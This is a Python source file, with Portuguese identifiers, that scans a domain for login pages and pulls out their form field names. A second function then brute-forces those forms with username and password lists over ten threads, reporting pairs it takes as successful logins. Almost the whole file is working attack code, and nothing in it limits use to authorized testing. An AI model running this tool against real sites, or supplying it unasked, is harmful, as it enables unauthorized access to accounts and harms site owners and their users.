import concurrent.futures
from urllib.parse import urljoin
from typing import List, Dict

import requests
from bs4 import BeautifulSoup

from utils import logger

import logging
logger = logging.getLogger(__name__)

def detectar_login_urls(dominio: str, session: requests.Session, paths: List[str]) -> List[Dict]:
    """
    Varre paths em busca de páginas de login, retornando detalhes.
    """
    resultados = []
    base_urls = [f"https://{dominio}", f"http://{dominio}"]

    for path in paths:
        for base in base_urls:
            url = urljoin(base, path)
            try:
                resp = session.get(url, timeout=5, allow_redirects=True)
                if resp.status_code != 200:
                    continue

                soup = BeautifulSoup(resp.text, 'html.parser')
                titulo = soup.title.string.lower() if soup.title else ''
                inputs = soup.find_all('input')
                has_password = any(inp.get('type') == 'password' for inp in inputs)
                forms = soup.find_all('form')

                is_login = (
                    has_password or
                    'login' in titulo or
                    'signin' in titulo or
                    any('password' in str(form).lower() for form in forms) or
                    any(inp.get('name') in ['username', 'user', 'email'] for inp in inputs)
                )

                if is_login:
                    campos = {}
                    for inp in inputs:
                        name = inp.get('name')
                        if name:
                            if inp.get('type') == 'password':
                                campos['password_field'] = name
                            elif name.lower() in ['username', 'user', 'email', 'login']:
                                campos['username_field'] = name

                    metodo = 'POST'
                    if forms:
                        method = forms[0].get('method', 'get').upper()
                        if method in ['GET', 'POST']:
                            metodo = method

                    resultados.append({
                        'url': url,
                        'titulo': titulo[:50],
                        'campos': campos,
                        'metodo': metodo
                    })
            except Exception as e:
                logger.debug(f"Erro ao acessar {url}: {e}")
    return resultados

def brute_force_login(url: str, session: requests.Session, usuario_field: str, senha_field: str,
                      usuarios: List[str], senhas: List[str], metodo='POST') -> List[Dict]:
    """
    Tenta combinações de usuário/senha em uma página de login.
    Retorna lista de credenciais válidas encontradas.
    """
    sucessos = []

    def tentar(user, pwd):
        try:
            if metodo.upper() == 'POST':
                data = {usuario_field: user, senha_field: pwd}
                resp = session.post(url, data=data, timeout=5, allow_redirects=False)
            else:
                params = {usuario_field: user, senha_field: pwd}
                resp = session.get(url, params=params, timeout=5, allow_redirects=False)

            if resp.status_code == 302 or 'location' in resp.headers:
                return (user, pwd, 'redirecionamento')
            elif 'logout' in resp.text.lower() or 'dashboard' in resp.text.lower():
                return (user, pwd, 'conteúdo interno')
            elif 'invalid' not in resp.text.lower() and 'falhou' not in resp.text.lower():
                return (user, pwd, 'possível sucesso (verificar)')
        except:
            pass
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futuros = {executor.submit(tentar, u, s): (u, s) for u in usuarios for s in senhas}
        for futuro in concurrent.futures.as_completed(futuros):
            resultado = futuro.result()
            if resultado:
                sucessos.append({
                    'usuario': resultado[0],
                    'senha': resultado[1],
                    'indicador': resultado[2]
                })
    return sucessos